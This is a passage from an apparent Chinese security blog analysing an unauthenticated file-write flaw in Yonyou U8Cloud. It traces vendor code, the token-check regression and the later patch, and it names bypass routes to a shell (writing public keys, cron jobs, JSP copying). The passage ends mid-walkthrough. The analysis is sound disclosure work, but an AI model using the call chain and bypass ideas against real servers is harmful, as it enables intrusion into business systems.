+<p>该接口定义在 <code>U8CERP\modules\uap\lib\pubmobile.jar!nc.bs.framework.core.service.IHRMultiServicesInvorker</code>: </p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> nc.bs.framework.core.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHRMultiServicesInvorker</span> &#123;</span><br><span class="line">    String <span class="title function_">multiStrServicesInvorker</span><span class="params">(List&lt;String&gt; list, List&lt;List&lt;String&gt;&gt; list2, List&lt;List&lt;Class[]&gt;&gt; list3, List&lt;List&lt;Object[]&gt;&gt; list4, List&lt;Map&gt; list5)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line"></span><br><span class="line">    List <span class="title function_">multiListServicesInvorker</span><span class="params">(List&lt;String&gt; list, List&lt;List&lt;String&gt;&gt; list2, List&lt;List&lt;Class[]&gt;&gt; list3, List&lt;List&lt;Object[]&gt;&gt; list4, List&lt;Map&gt; list5)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个接口的实现类位于 <code>U8CERP\modules\uap\META-INF\lib\mobile.jar!nc.bs.framework.core.service.HRMultiServicesInvorkerImpl</code>: </p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> nc.bs.framework.core.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> nc.bs.framework.common.NCLocator;</span><br><span class="line"><span class="keyword">import</span> nc.bs.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HRMultiServicesInvorkerImpl</span> <span class="keyword">implements</span> <span class="title class_">IHRMultiServicesInvorker</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">multiStrServicesInvorker</span><span class="params">(List&lt;String&gt; servicenames, List&lt;List&lt;String&gt;&gt; methodnames, List&lt;List&lt;Class[]&gt;&gt; paramsClass, List&lt;List&lt;Object[]&gt;&gt; params, List&lt;Map&gt; assinfo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> servicenames.size();</span><br><span class="line">        <span class="type">String</span> <span class="variable">resultjson</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">serviceObject</span> <span class="operator">=</span> NCLocator.getInstance().lookup(servicenames.get(i));</span><br><span class="line">            <span class="type">List</span> <span class="variable">smname</span> <span class="operator">=</span> methodnames.get(i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">mlen</span> <span class="operator">=</span> smname.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; mlen; j++) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">sm</span> <span class="operator">=</span> serviceObject.getClass().getMethod(smname.get(j), paramsClass.get(i).get(j));</span><br><span class="line">                sm.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> sm.invoke(serviceObject, params.get(i).get(j));</span><br><span class="line">                resultjson = JSON.toJSONString(o);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultjson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">multiListServicesInvorker</span><span class="params">(List&lt;String&gt; servicenames, List&lt;List&lt;String&gt;&gt; methodnames, List&lt;List&lt;Class[]&gt;&gt; paramsClass, List&lt;List&lt;Object[]&gt;&gt; params, List&lt;Map&gt; assinfo)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Logger.error(<span class="string">&quot;-------------调用接口--------------------&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">resultListMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> servicenames.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">serviceObject</span> <span class="operator">=</span> NCLocator.getInstance().lookup(servicenames.get(i));</span><br><span class="line">            <span class="type">List</span> <span class="variable">smname</span> <span class="operator">=</span> methodnames.get(i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">mlen</span> <span class="operator">=</span> smname.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; mlen; j++) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">sm</span> <span class="operator">=</span> serviceObject.getClass().getMethod(smname.get(j), paramsClass.get(i).get(j));</span><br><span class="line">                sm.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> sm.invoke(serviceObject, params.get(i).get(j));</span><br><span class="line">                <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">                    resultListMap = (List) obj;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    resultListMap.add(obj);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> resultListMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个方法接收服务名称 , 方法名称 , 参数类型 , 具体参数等等 , 然后通过反射去调用具体服务类的方法</p>
+<p>通过 POC 能看到它调用的是 <code>nc.itf.uap.pfxx.IPFxxFileService</code> 的 <code>writeDocToXMLFile</code>方法</p>
+<p>该接口位于 <code>U8CERP\modules\uapeai\lib\pubuapeaipfxx.jar!nc.itf.uap.pfxx.IPFxxFileService#writeDocToXMLFile</code></p>
+<p>实现类位于 <code>U8CERP\modules\uapeai\lib\pubuapeaipfxx.jar!nc.bs.pfxx.pub.PFxxFileServiceImpl#writeDocToXMLFile</code></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> File <span class="title function_">writeDocToXMLFile</span><span class="params">(<span class="type">byte</span>[] filedata, String filename)</span> <span class="keyword">throws</span> BusinessException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> FileUtils.writeBytesToFile(filedata, filename);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Logger.error(<span class="string">&quot;Writing File error!&quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessException</span>(<span class="string">&quot;Writing File error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>跟进 :</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUtils</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> File <span class="title function_">writeBytesToFile</span><span class="params">(<span class="type">byte</span>[] filedata, String filename)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="type">File</span> <span class="variable">pFile</span> <span class="operator">=</span> file.getParentFile();</span><br><span class="line">        <span class="keyword">if</span> (!pFile.exists()) &#123;</span><br><span class="line">            pFile.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Debug.debug(NCLangResOnserver.getInstance().getStrByID(<span class="string">&quot;uffactory_hyeaa&quot;</span>, <span class="string">&quot;UPPuffactory_hyeaa-000521&quot;</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;file.getAbsolutePath()&#125;));</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        outStream.write(filedata);</span><br><span class="line">        outStream.close();</span><br><span class="line">        Debug.debug(NCLangResOnserver.getInstance().getStrByID(<span class="string">&quot;uffactory_hyeaa&quot;</span>, <span class="string">&quot;UPPuffactory_hyeaa-000522&quot;</span>, (String)<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;file.getAbsolutePath()&#125;));</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>传入文件内容以及文件路径即可进行写入</p>
+<p>至此 , 文件写入的流程就分析完毕了 :</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc.bs.framework.comn.serv.CommonServletDispatcher#doGet</span><br><span class="line">nc.bs.framework.comn.serv.ServiceDispatcher#execCall</span><br><span class="line">nc.bs.framework.core.service.HRMultiServicesInvorkerImpl#multiStrServicesInvorker</span><br><span class="line">nc.bs.pfxx.pub.PFxxFileServiceImpl#writeDocToXMLFile</span><br><span class="line">nc.vo.pfxx.util.FileUtils#writeBytesToFile</span><br></pre></td></tr></table></figure></div>
+
+<p>下面看看为什么可以未授权</p>
+<h2 id="未授权分析"><a href="#未授权分析" class="headerlink" title="未授权分析"></a>未授权分析</h2><p>这个未授权漏洞是打了含有漏洞的补丁之后才有的 , 在打该补丁之前我们运行 POC 会返回无效 token :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758551076784-933bcb05-5547-4520-b659-3fca09fb3c5a.png"
+                     
+                ></p>
+<p>顺着堆栈我们可以找到问题出在 nc.bs.framework.comn.serv.ServiceDispatcher#execCall :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758549571457-5683a18f-d5f0-432b-bf30-47a8bf860df7.png"
+                     
+                ></p>
+<p>这里是验证 Token 的 , 估计就是这里鉴权出了问题 , 对比一下打补丁前后的代码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758554114010-3075a6a1-14eb-4a42-8e23-86416af1cefb.png"
+                     
+                ></p>
+<p>先看打补丁前 ( 右边 ) :</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vertifyToken</span><span class="params">(String token, String service, String clientIP)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ServerConfiguration.getServerConfiguration().isSingle() || !ServerConfiguration.getServerConfiguration().isMaster()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.isTrustService(service)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.isTustIP(clientIP)) &#123;</span><br><span class="line">                <span class="built_in">this</span>.vertifyTokenIllegal(token, service);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">vertifyTokenIllegal</span><span class="params">(String token, String service)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtil.isEmptyWithTrim(token)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessRuntimeException</span>(<span class="string">&quot;invalid orginal token(null), please login!&quot;</span> + service);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">userCode</span> <span class="operator">=</span> InvocationInfoProxy.getInstance().getUserCode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">curToken</span> <span class="operator">=</span> <span class="built_in">this</span>.genToken(userCode);</span><br><span class="line">        <span class="keyword">if</span> (!curToken.equalsIgnoreCase(token)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessRuntimeException</span>(<span class="string">&quot;token error!, please login!&quot;</span> + service);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>根据报错的堆栈 , 可以知道是因为我们的 token 为空导致抛出异常</p>
+<p>再看有漏洞的版本 ( 左边 ) :</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vertifyToken</span><span class="params">(String token, String service, String clientIP)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">    <span class="keyword">if</span> ((!ServerConfiguration.getServerConfiguration().isSingle() &amp;&amp; ServerConfiguration.getServerConfiguration().isMaster()) || isTrustService(service) || isTustIP(clientIP)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vertifyTokenIllegal(token, service);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">vertifyTokenIllegal</span><span class="params">(String token, String service)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtil.isEmptyWithTrim(token)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessRuntimeException</span>(<span class="string">&quot;invalid orginal token(null), please login!&quot;</span> + service);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">userCode</span> <span class="operator">=</span> InvocationInfoProxy.getInstance().getUserCode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">curToken</span> <span class="operator">=</span> genToken(userCode);</span><br><span class="line">    <span class="keyword">if</span> (!curToken.equalsIgnoreCase(token)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BusinessRuntimeException</span>(<span class="string">&quot;token error!, please login!&quot;</span> + service);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>由于我们的 token 是空的 , 并且还没被检测出来</p>
+<p>所以说明我们肯定没有走到 vertifyTokenIllegal 方法 , 那么一定是 vertifyToken 方法中的判断被我们满足了</p>
+<p>首先第一个 <code>!ServerConfiguration.getServerConfiguration().isSingle() &amp;&amp; ServerConfiguration.getServerConfiguration().isMaster()</code> 肯定不满足 , 因为我本地只有一台机器</p>
+<p>第三个肯定也不满足 , 两个版本的 U8CERP\ierp\bin\token\trustIPList.conf 文件都是空的</p>
+<p>那么只能是第二个条件了 , 对比两个版本的 U8CERP\ierp\bin\token\trustServiceList.conf 文件 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758554798901-f2def529-ef8a-452c-9d8e-5c290174e363.png"
+                     
+                ></p>
+<p>发现 IHRMultiServicesInvorker 服务被设为信任服务了 , 所以导致了未授权漏洞</p>
+<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>下载最新补丁 , 可以看到里面对 FileUtils 进行了替换 :</p>
+<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">installpatch</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">copy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>/replacement/modules/<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>/modules/<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">copy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">installpatch</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">│  installpatch.xml</span><br><span class="line">│  packmetadata.xml</span><br><span class="line">│  readme.txt</span><br><span class="line">│</span><br><span class="line">└─replacement</span><br><span class="line">    └─modules</span><br><span class="line">        └─uapeai</span><br><span class="line">            └─classes</span><br><span class="line">                └─nc</span><br><span class="line">                    └─vo</span><br><span class="line">                        └─pfxx</span><br><span class="line">                            └─util</span><br><span class="line">                                    FileUtils$1.class</span><br><span class="line">                                    FileUtils.class</span><br></pre></td></tr></table></figure></div>
+
+<p>对比一下看看改了什么东西 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758591613833-5b44692e-1ddd-426e-9a5a-85b402f76ac2.png"
+                     
+                ></p>
+<p>可以看到新版添加了一个判断 :</p>
+<p>只有新建的文件的规范路径<strong>不</strong>以项目家目录下的 webapps&#x2F;u8c_web&#x2F; 开头才能成功写入</p>
+<p>但是没有限制向别的目录写文件 , 应该还是能做到写公钥 , 定时任务来 getshell 的</p>
+<p>而且也没有限制 <code>jsp</code> 等后缀 , 感觉也可以通过某个方法进行文件复制来 rce</p>
+<p>并且未授权也没有修复 : 打了最新补丁后 , IHRMultiServicesInvorker 依旧在信任服务里 , 可能是业务需求吧</p>
+<h2 id="详细调用流程"><a href="#详细调用流程" class="headerlink" title="详细调用流程"></a>详细调用流程</h2><p>首先进入 doGet 方法 , 里面会进行一些日志的记录等等 , 然后调用 <code>this.serviceHandler.execCall(request, response)</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758549911360-db154dc4-c648-4439-95d6-17443f078a4e.png"
+                     
+                ></p>
+<p>跟进 , 进入 U8CERP\external\lib\fw.jar!nc.bs.framework.comn.serv.ServiceDispatcher#execCall</p>
+<p>这里对请求中的序列化数据进行了反序列化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758550212325-6c65fd48-7720-4ec3-aa2e-225e9e55bdc1.png"
+                     
+                ></p>
+<p>然后从请求中取值 , 放进反序列化的对象中 , 不过这些参数没什么用 , 不用管</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758550299505-6f6b6ed6-e40a-4315-82d5-1dd8e78382d8.png"
+                     
+                ></p>
+<p>然后根据对象中存储的一些字段信息 , 去调用指定服务类的指定方法 :</p>
+<p>( 验证 Token 的部分前面已经详细说过了 , 这里就不赘述了 )</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758550388208-85a8f4b6-966b-410e-9aff-82400c0a54e1.png"
+                     
+                ></p>
+<p>然后跟进 nc.bs.framework.comn.serv.ServiceDispatcher#invokeBeanMethod</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758691794162-f3f4c2d7-2e11-4282-9774-96f41dbc41ae.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758691895964-b02a9eed-ceb0-4f32-9611-512fedfd6dc0.png"
+                     
+                ></p>
+<p>这里有个小坑点 , 我们 poc 传的 module 是空字符串 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758691972056-62a652e6-cf32-4f1b-bc31-c95b89dad820.png"
+                     
+                ></p>
+<p>所以在找类的时候 325 行的这个判断其实是不满足的 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758692031574-2263b488-f94a-4049-926a-01ab88d5e22b.png"
+                     
+                ></p>
+<blockquote>
+<p>如果是静态分析的话可能一个不注意可能就跟错地方了 , 不过后面测试了一下 , 传一个 null 也是可以成功的</p>
+</blockquote>
+<p>接下来我们跟一下看看它是怎么获取 Context 并调用类的</p>
+<p>首先进入 else 分支 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758703407597-e3018748-ffd7-4a05-9c48-61f6ea993ba2.png"
+                     
+                ></p>
+<p>这里调用 nc.bs.framework.server.ModuleNCLocator#lookup , 跟进 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758703560024-01a3fca1-1f54-41e9-992b-3927e70adf74.png"
+                     
+                ></p>
+<p>可以看到它又调用了另一个 context 的 lookup 方法</p>
+<p>跟进 nc.bs.framework.server.BusinessAppServer#getContext 看看是哪个 Context</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758704322479-a7b2a028-3640-4070-8769-6aace0c3d84b.png"
+                     
+                ></p>
+<p>这里就不好跟了 , 经过动态调试会发现走到了 nc.bs.framework.server.AbstractContext#lookup</p>
+<p>如果 module 传 null 的话 , 调用过程如下 : </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
